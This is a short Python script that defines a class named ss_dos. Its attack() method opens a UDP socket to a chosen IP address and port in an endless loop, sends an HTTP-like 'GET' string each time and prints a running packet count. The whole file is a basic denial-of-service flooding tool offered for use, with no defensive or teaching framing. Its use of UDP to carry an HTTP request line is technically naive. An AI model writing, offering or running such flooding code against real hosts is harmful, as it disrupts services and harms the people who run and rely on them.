import socket

def help():
    print("function:\n--> __init__()\n--> attack()\n--> help()")

class ss_dos():

    def __init__(self, ip, port):
        self.port = port
        self.ip = ip

    def attack(self):
        attack_num = 0
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.ip, self.port))
            s.sendto(("GET /" + self.ip + " HTTP/1.1\r\n").encode('ascii'), (self.ip, self.port))
            
            attack_num += 1
            print(f"sent {attack_num} packet to {self.ip} with port {self.port}")
            
            s.close()

